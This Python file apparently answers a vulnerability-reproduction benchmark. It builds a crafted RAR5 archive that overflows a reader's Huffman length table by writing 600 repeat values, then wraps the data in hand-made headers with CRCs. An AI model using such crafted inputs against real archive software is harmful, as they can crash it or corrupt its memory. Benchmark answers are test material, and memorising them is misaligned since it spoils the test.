import zlib

class Solution:
    """
    Generates a Proof-of-Concept (PoC) input that triggers a Stack Buffer Overflow
    vulnerability in a RAR5 reader during Huffman table parsing.
    """
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball (unused).

        Returns:
            bytes: The PoC input that should trigger the vulnerability.
        """
        
        def to_vint(n: int) -> bytes:
            """Encodes an integer into the RAR5 variable-length integer format."""
            res = bytearray()
            while True:
                b = n & 0x7f
                n >>= 7
                if n == 0:
                    res.append(b)
                    break
                res.append(b | 0x80)
            return bytes(res)

        class BitStream:
            """A helper class to write data bit-by-bit in LSB-first order."""
            def __init__(self):
                self.data = bytearray()
                self.current_byte = 0
                self.bit_count = 0

            def write_bits(self, value: int, num_bits: int):
                for i in range(num_bits):
                    bit = (value >> i) & 1
                    self.current_byte |= (bit << self.bit_count)
                    self.bit_count += 1
                    if self.bit_count == 8:
                        self.data.append(self.current_byte)
                        self.current_byte = 0
                        self.bit_count = 0

            def get_bytes(self) -> bytes:
                if self.bit_count > 0:
                    self.data.append(self.current_byte)
                return bytes(self.data)

        # 1. Construct the malicious compressed data payload.
        stream = BitStream()

        # Craft a Huffman pre-table (20 4-bit lengths) to decode the main table.
        # We define a table where symbol '1' and symbol '17' (repeat operator)
        # get short 1-bit codes. pretable[1]=1 and pretable[17]=1 achieves this,
        # giving symbol '1' code '0' and symbol '17' code '1'.
        pretable_lengths = [0] * 20
        pretable_lengths[1] = 1
        pretable_lengths[17] = 1
        for length in pretable_lengths:
            stream.write_bits(length, 4)

        # Write the compressed main table data. First, a value to be repeated.
        # We write symbol '1' (code '0') to establish a value to repeat.
        stream.write_bits(0, 1)

        # Repeatedly write the repeat operator (symbol '17') to cause an overflow.
        # Symbol '17' (code '1') is followed by 3 bits for a count, which is then
        # incremented by 3. We use the max value '111' (7) for 10 repetitions.
        # Looping 60 times writes 600 values, sufficient to overflow typical buffers.
        num_overflow_loops = 60
        for _ in range(num_overflow_loops):
            stream.write_bits(1, 1)  # Symbol 17
            stream.write_bits(7, 3)  # Repeat count
        
        payload = stream.get_bytes()

        # 2. Construct the RAR5 File Header block.
        file_header_data = bytearray()
        file_header_data += to_vint(0x02)                # Header Type: File
        file_header_data += to_vint(0x04)                # Header Flags: Has file CRC32
        file_header_data += to_vint(len(payload))        # Packed Size
        file_header_data += to_vint(1)                   # Unpacked Size
        file_header_data += to_vint(0)                   # Attributes
        file_header_data += (0).to_bytes(4, 'little')    # File CRC32 (dummy)
        file_header_data += to_vint(0x35)                # Compression: RAR5
        file_header_data += to_vint(2)                   # Host OS: Unix
        file_header_data += to_vint(1)                   # File name length
        file_header_data += b'a'                         # File name
        
        header_size_vint = to_vint(len(file_header_data))
        crc_data = header_size_vint + file_header_data
        crc_val = zlib.crc32(crc_data) & 0xffffffff
        crc = crc_val.to_bytes(4, 'little')
        file_header_block = crc + header_size_vint + file_header_data

        # 3. Construct the End of Archive Header block.
        eoa_header_data = to_vint(0x05) + to_vint(0)
        eoa_header_size_vint = to_vint(len(eoa_header_data))
        crc_data = eoa_header_size_vint + eoa_header_data
        crc_val = zlib.crc32(crc_data) & 0xffffffff
        crc = crc_val.to_bytes(4, 'little')
        eoa_header_block = crc + eoa_header_size_vint + eoa_header_data

        # 4. Assemble the final PoC file.
        poc = (
            b'Rar!\x1a\x07\x01\x00' +
            file_header_block +
            payload +
            eoa_header_block
        )
        return poc